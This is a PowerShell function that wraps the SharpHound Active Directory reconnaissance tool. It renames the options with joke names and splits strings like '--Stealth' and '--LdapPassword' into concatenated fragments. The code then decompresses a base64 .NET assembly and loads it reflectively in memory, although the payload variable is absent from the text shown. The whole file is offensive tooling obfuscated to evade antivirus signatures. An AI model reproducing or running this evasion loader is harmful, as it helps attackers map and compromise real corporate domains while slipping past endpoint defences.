function BH-FOO
{
    [CmdletBinding(PositionalBinding = $false)]
    param(
        [Alias("c")]
        [String[]]
        $CMe = [String[]]@('Default'),

        [Alias("d")]
        [String]
        $DOM,
        
        [Alias("s")]
        [Switch]
        $SF,

        [Switch]
        $Sneky,

        [String]
        $uwu,

        [String]
        $coolName,

        [String]
        $cFile,

        [ValidateScript({ Test-Path -Path $_ })]
        [String]
        $output = $( Get-Location ),

        [ValidateNotNullOrEmpty()]
        [String]
        $prefixing,

        [String]
        $CASH,

        [Switch]
        $memCASH,

        [Switch]
        $rebuildCASH,

        [Switch]
        $randomDancing,

        [String]
        $zipper,
        
        [Switch]
        $zipperBroke,
        
        [String]
        $letmein,
        
        [Switch]
        $trackStar,
        
        [Switch]
        $prettify,

        [String]
        $WTFUsername,

        [String]
        $WTFPassword,

        [string]
        $transformers,

        [ValidateRange(0, 65535)]
        [Int]
        $WTFPort,

        [Switch]
        $ddogggy,
        
        [Switch]
        $OKBOOMER,

        [Switch]
        $NoFlashPhotography,

        [Switch]
        $NoPort,

        [ValidateRange(50, 5000)]
        [Int]
        $UrInTimeout = 500,

        [Switch]
        $roundabout,

        [Switch]
        $ExcludeMarvel,

        [Int]
        $Throttle,

        [ValidateRange(0, 100)]
        [Int]
        $Jitter,

        [Int]
        $Threads,

        [Switch]
        $WEdding,

        [String]
        $OverrideUsername,

        [String]
        $Fortnite,

        [Switch]
        $GRABALL,

        [Switch]
        $Loop,

        [String]
        $LoopDuration,

        [String]
        $LoopInterval,

        [ValidateRange(500, 60000)]
        [Int]
        $StatusInterval,
        
        [Alias("v")]
        [ValidateRange(0, 5)]
        [Int]
        $Verbosity,

        [Alias("h")]
        [Switch]
        $Help,

        [Switch]
        $Version
    )

    $wotRThese = New-Object System.Collections.Generic.List[System.Object]

    if ($CMe)
    {
        $wotRThese.Add("--Colle"+"ctionMethods");
        foreach ($cmethod in $CMe)
        {
            $wotRThese.Add($cmethod);
        }
    }

    if ($DOM)
    {
        $wotRThese.Add("--D"+"omain");
        $wotRThese.Add($DOM);
    }
    
    if ($SF)
    {
        $wotRThese.Add("--Sea"+"rchF"+"orest")    
    }

    if ($Sneky)
    {
        $wotRThese.Add("--St"+"eal"+"th")
    }

    if ($uwu)
    {
        $wotRThese.Add("--Ld"+"ap"+"Fil"+"ter");
        $wotRThese.Add($uwu);
    }

    if ($coolName)
    {
        $wotRThese.Add("--Dist"+"ingu"+"ish"+"edName")
        $wotRThese.Add($coolName)
    }
    
    if ($cFile)
    {
        $wotRThese.Add("--Comp"+"ut"+"er"+"File");
        $wotRThese.Add($cFile);
    }

    if ($output)
    {
        $wotRThese.Add("--Outpu"+"tD"+"irect"+"ory");
        $wotRThese.Add($output);
    }

    if ($prefixing)
    {
        $wotRThese.Add("--Outpu"+"tPr"+"efix");
        $wotRThese.Add($prefixing);
    }

    if ($CASH)
    {
        $wotRThese.Add("--Ca"+"che"+"Name");
        $wotRThese.Add($CASH);
    }

    if ($NoSaveCache)
    {
        $wotRThese.Add("--M"+"emC"+"ache");
    }

    if ($rebuildCASH)
    {
        $wotRThese.Add("--Reb"+"ui"+"ldC"+"ache");
    }

    if ($randomDancing)
    {
        $wotRThese.Add("--Ra"+"ndo"+"mFi"+"lenames");
    }

    if ($zipper)
    {
        $wotRThese.Add("--Zi"+"pF"+"il"+"eName");
        $wotRThese.Add($zipper);
    }

    if ($zipperBroke)
    {
        $wotRThese.Add("--N"+"oZ"+"ip");
    }

    if ($letmein)
    {
        $wotRThese.Add("--Z"+"ip"+"Pa"+"ssword");
        $wotRThese.Add($letmein)
    }

    if ($trackStar)
    {
        $wotRThese.Add("--Tra"+"ckC"+"omp"+"uterCalls")
    }

    if ($prettify)
    {
        $wotRThese.Add("--P"+"ret"+"tyPrint");
    }

    if ($WTFUsername)
    {
        $wotRThese.Add("--Lda"+"pUs"+"ername");
        $wotRThese.Add($WTFUsername);
    }

    if ($WTFPassword)
    {
        $wotRThese.Add("--Ld"+"ap"+"Pa"+"ss"+"word");
        $wotRThese.Add($WTFPassword);
    }

    if ($transformers)
    {
        $wotRThese.Add("--Do"+"ma"+"in"+"Cont"+"roller");
        $wotRThese.Add($transformers);
    }
    
    if ($WTFPort)
    {
        $wotRThese.Add("--Ld"+"ap"+"Po"+"rt");
        $wotRThese.Add($WTFPort);
    }
    
    if ($ddogggy)
    {
        $wotRThese.Add("-"+"-Se"+"cur"+"eL"+"dap");
    }
    
    if ($OKBOOMER) 
    {
        $wotRThese.Add("--Di"+"sa"+"bl"+"eC"+"ertVer"+"if"+"ication")    
    }

    if ($NoFlashPhotography)
    {
        $wotRThese.Add("--D"+"is"+"ab"+"le"+"Si"+"gning");
    }

    if ($NoPort)
    {
        $wotRThese.Add("--Skip"+"Por"+"tCh"+"eck");
    }

    if ($UrInTimeout)
    {
        $wotRThese.Add("--Po"+"rtC"+"heck"+"Timeout")
        $wotRThese.Add($UrInTimeout)
    }

    if ($roundabout)
    {
        $wotRThese.Add("--Skip"+"Pas"+"sw"+"ordCh"+"eck");
    }

    if ($ExcludeMarvel)
    {
        $wotRThese.Add("--Excl"+"ud"+"eDCs")
    }

    if ($Throttle)
    {
        $wotRThese.Add("--Th"+"ro"+"ttle");
        $wotRThese.Add($Throttle);
    }

    if ($Jitter -gt 0)
    {
        $wotRThese.Add("--"+"Ji"+"tt"+"er");
        $wotRThese.Add($Jitter);
    }
    
    if ($Threads)
    {
        $wotRThese.Add("--"+"Th"+"re"+"ads")
        $wotRThese.Add($Threads)
    }

    if ($WEdding)
    {
        $wotRThese.Add("--S"+"ki"+"pR"+"eg"+"is"+"tr"+"yL"+"og"+"gedOn")
    }

    if ($OverrideUserName)
    {
        $wotRThese.Add("--O"+"ve"+"rr"+"id"+"eU"+"serName")
        $wotRThese.Add($OverrideUsername)
    }
    
    if ($Fortnite)
    {
        $wotRThese.Add("--R"+"ea"+"lD"+"NS"+"Name")
        $wotRThese.Add($Fortnite)
    }

    if ($GRABALL)
    {
        $wotRThese.Add("--Coll"+"ec"+"tA"+"ll"+"Pr"+"op"+"er"+"ties")
    }

    if ($Loop)
    {
        $wotRThese.Add("-"+"-L"+"oop")
    }

    if ($LoopDuration)
    {
        $wotRThese.Add("--Lo"+"op"+"Du"+"ra"+"tion")
        $wotRThese.Add($LoopDuration)
    }

    if ($LoopInterval)
    {
        $wotRThese.Add("--"+"Lo"+"op"+"In"+"terval")
        $wotRThese.Add($LoopInterval)
    }

    if ($StatusInterval)
    {
        $wotRThese.Add("--"+"St"+"at"+"us"+"In"+"terval")
        $wotRThese.Add($StatusInterval)
    }

    if ($Verbosity)
    {
        $wotRThese.Add("-"+"v");
        $wotRThese.Add($Verbosity);
    }    

    if ($Help)
    {
        $wotRThese.clear()
        $wotRThese.Add("--Help");
    }

    if ($Version)
    {
        $wotRThese.clear();
        $wotRThese.Add("--Version");
    }

    $juggernaut = [string[]]$wotRThese.ToArray()


	$dStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($iphone),[IO.Compression.CompressionMode]::Decompress)
	$bbbytes = New-Object Byte[](908288)
	$dStream.Read($bbbytes, 0, 908288) | Out-Null
	$penguin = [Reflection.Assembly]::Load($bbbytes)
	$sixflags = [Reflection.BindingFlags] "Public,Static"
	$a = @()
	$penguin.GetType("Cos"+"tu"+"ra"+".A"+"ss"+"em"+"bl"+"yLoader", $false).GetMethod("A"+"tt"+"ach", $sixflags).Invoke($Null, @())
	$penguin.GetType("S"+"ha"+"rp"+"ho"+"un"+"d."+"Pr"+"og"+"ram").GetMethod("I"+"nv"+"ok"+"eS"+"ha"+"rp"+"Ho"+"und").Invoke($Null, @(,$juggernaut))
}